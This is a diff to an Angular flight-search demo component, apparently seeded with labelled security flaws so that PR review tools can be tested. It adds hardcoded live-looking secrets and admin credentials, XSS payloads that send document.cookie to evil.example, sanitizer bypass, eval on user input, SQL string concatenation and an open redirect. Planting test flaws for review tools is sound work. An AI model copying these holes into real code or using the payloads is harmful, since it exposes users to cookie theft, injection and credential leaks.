@@ -1,10 +1,12 @@
 // ============================================================
 // DEMO FILE — FlightSearchComponent
 // Mixed SSR + performance + documentation issues
+// PLUS seeded SECURITY / CRITICAL blockers for PR review testing
 // ============================================================
 
 import { Component, OnInit, Output, EventEmitter } from '@angular/core';
-import { HttpClient } from '@angular/common/http';
+import { HttpClient, HttpHeaders } from '@angular/common/http';
+import { DomSanitizer, SafeHtml } from '@angular/platform-browser';
 
 export interface FlightSearch {
   origin:      string;
@@ -46,6 +48,11 @@ export interface Flight {
       <input type="date" [(ngModel)]="search.departDate">
       <input type="date" [(ngModel)]="search.returnDate">
 
+      <!-- ISSUE (Security Critical): innerHTML with unsanitized API / user content — XSS -->
+      <div [innerHTML]="promoBannerHtml"></div>
+      <!-- ISSUE (Security Critical): bypassed Angular sanitizer — stored XSS -->
+      <div [innerHTML]="trustedAirlineHtml"></div>
+
       <!-- ISSUE: No ARIA live region for search results (A11y) -->
       <div *ngIf="results.length > 0">
         <!-- ISSUE: *ngFor without trackBy (Performance) -->
@@ -70,19 +77,72 @@ export class FlightSearchComponent implements OnInit {
   };
   results: Flight[] = [];
 
-  constructor(private http: HttpClient) {}
+  // ISSUE (Security Critical): Hardcoded live API key / secret in client bundle
+  private stripeSecretKey = 'sk_live_51NzFlightSearchAbCdEfGhIjKlMnOpQrStUvWxYz99';
+  private awsAccessKey = 'AKIAIOSFODNN7EXAMPLE';
+  private awsSecretKey = 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY';
+  private jwtSigningSecret = 'super-secret-jwt-key-do-not-share';
+  private dbConnectionString = 'postgres://admin:P@ssw0rd!@prod-db.internal:5432/flights';
+
+  // ISSUE (Security Critical): Hardcoded production credentials
+  private adminUser = 'admin';
+  private adminPassword = 'Admin123!';
+
+  // ISSUE (Security Critical): XSS payload bound via innerHTML
+  promoBannerHtml = '<img src=x onerror="fetch(\'https://evil.example/steal?c=\'+document.cookie)">';
+  trustedAirlineHtml: SafeHtml = '';
+
+  constructor(
+    private http: HttpClient,
+    private sanitizer: DomSanitizer,
+  ) {}
 
   ngOnInit(): void {
     // ISSUE: Reads window.history without platform guard (SSR Critical)
     const lastSearch = window.sessionStorage.getItem('last_flight_search');
     if (lastSearch) this.search = JSON.parse(lastSearch);
+
+    // ISSUE (Security Critical): Auth token + PII stored in localStorage (XSS-exfiltratable)
+    const token = localStorage.getItem('auth_token');
+    const passport = localStorage.getItem('passenger_passport_number');
+    console.log('Flight search boot — token:', token, 'passport:', passport, 'stripe:', this.stripeSecretKey);
+
+    // ISSUE (Security Critical): bypassSecurityTrustHtml disables Angular XSS protection
+    this.trustedAirlineHtml = this.sanitizer.bypassSecurityTrustHtml(
+      '<script>document.location="https://evil.example/?cookie="+document.cookie</script>'
+    );
   }
 
   searchFlights(): void {
+    // ISSUE (Security Critical): Secrets sent as headers from the browser; http:// (no TLS)
+    const headers = new HttpHeaders({
+      'Authorization': `Bearer ${this.stripeSecretKey}`,
+      'X-AWS-Key': this.awsAccessKey,
+      'X-AWS-Secret': this.awsSecretKey,
+      'X-Admin-Password': this.adminPassword,
+    });
+
     // ISSUE: No catchError handler (API Mapping)
-    this.http.post<Flight[]>('/api/flights/search', this.search).subscribe(flights => {
+    this.http.post<Flight[]>(
+      'http://flights-api.internal/search?q=' + this.search.origin,
+      {
+        ...this.search,
+        // ISSUE (Security Critical): SQL assembled from unsanitized user input
+        rawQuery: `SELECT * FROM flights WHERE origin = '${this.search.origin}' AND dest = '${this.search.destination}'`,
+        jwtSecret: this.jwtSigningSecret,
+        db: this.dbConnectionString,
+      },
+      { headers, withCredentials: true },
+    ).subscribe(flights => {
       this.results = flights;
       sessionStorage.setItem('last_flight_search', JSON.stringify(this.search));
+
+      // ISSUE (Security Critical): eval of concatenated user input — RCE / XSS
+      eval('console.log("search origin: ' + this.search.origin + '")');
+
+      // ISSUE (Security Critical): Function constructor is another eval primitive
+      const formatter = new Function('price', 'return price + "' + this.search.origin + '"');
+      formatter((flights[0] && flights[0].price) || 0);
     });
   }
 
@@ -102,5 +162,24 @@ export class FlightSearchComponent implements OnInit {
     this.flightSelected.emit(flight);
     // ISSUE: window access without platform check (SSR)
     window.scrollTo({ top: 0, behavior: 'smooth' });
+
+    // ISSUE (Security Critical): Open redirect — user-controlled URL, no allowlist
+    const redirect = new URLSearchParams(window.location.search).get('next');
+    if (redirect) {
+      window.location.href = redirect;
+    }
+
+    // ISSUE (Security Critical): document.write with unsanitized flight data — XSS
+    document.write('<h1>Booking ' + flight.airline + '</h1>');
+  }
+
+  // ISSUE (Security Critical): Client-side "auth" check that can be bypassed
+  isAdmin(): boolean {
+    return this.adminUser === 'admin' && this.adminPassword === 'Admin123!';
+  }
+
+  // ISSUE (Security Critical): Weak / predictable token generation used as a session id
+  issueSessionToken(): string {
+    return btoa(this.adminUser + ':' + this.adminPassword + ':' + Date.now());
   }
 }
